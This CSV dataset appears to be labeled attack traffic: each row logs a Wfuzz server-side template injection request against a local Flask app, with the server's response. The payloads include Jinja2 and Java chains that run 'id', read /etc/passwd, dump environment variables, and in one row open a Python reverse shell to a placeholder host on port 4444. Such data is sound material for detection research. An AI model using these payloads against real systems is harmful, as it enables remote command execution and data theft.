attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{4*4}}[[5*5]],<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33884
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{7*'7'}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33890
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=@(1+2),"<h2>Hey,  </h2> ",close,16,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33904
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{%20''.__class__.__mro__[2].__subclasses__()%20}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33920
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={php}echo%20`id`;{/php},"<h2>Hey, {php}echo id{php}</h2> ",close,32,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33924
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.cache.util.os.system(""id"")}","<h2>Hey, {self.template.module.cache.util.os.systemid}</h2> ",close,60,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33940
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.util.os.system(""id"")}","<h2>Hey, {self.module.runtime.util.os.systemid}</h2> ",close,53,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33946
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}${self.module.cache.util.os.system(""id"")}","<h2>Hey, {org.apache.commons.io.tils.totringjava.lang.untime.getuntime.execjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.getnputtream}{self.module.cache.util.os.systemid}</h2> ",close,619,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33956
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=${T(java.lang.Runtime).getRuntime().exec('cat%20etc/passwd')},"<h2>Hey, {java.lang.untime.getuntime.execcat etcpasswd}</h2> ",close,61,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33968
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=${T(java.lang.System).getenv()},"<h2>Hey, {java.lang.ystem.getenv}</h2> ",close,39,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33976
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={%%20for%20x%20in%20().__class__.__base__.__subclasses__()%20%}{%%20if%20""warning""%20in%20x.__name__%20%}{{x()._module.__builtins__['__import__']('os').popen(""python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""ip\"",4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/cat\"",%20\""flag.txt\""]);'"").read().zfill(417)}}{%endif%}{%%20endfor%20%}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33986
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var%20x=new%20java.lang.ProcessBuilder;%20x.command(\\\""uname\\\"",\\\""-a\\\"");%20org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33998
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var%20x=new%20java.lang.ProcessBuilder;%20x.command(\\\""netstat\\\"");%20org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34006
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var%20x=new%20java.lang.ProcessBuilder;%20x.command(\\\""whoami\\\"");%20x.start()\"")}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34010
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new%20java.lang.String('xxx')\"")}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34022
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34024
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{request.__class__}},"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34038
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{request|attr(""__class__"")}}","<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34042
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{request|attr([""__"",""class"",""__""]|join)}}","<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34046
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{request|attr([""_""*2,""class"",""_""*2]|join)}}","<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34062
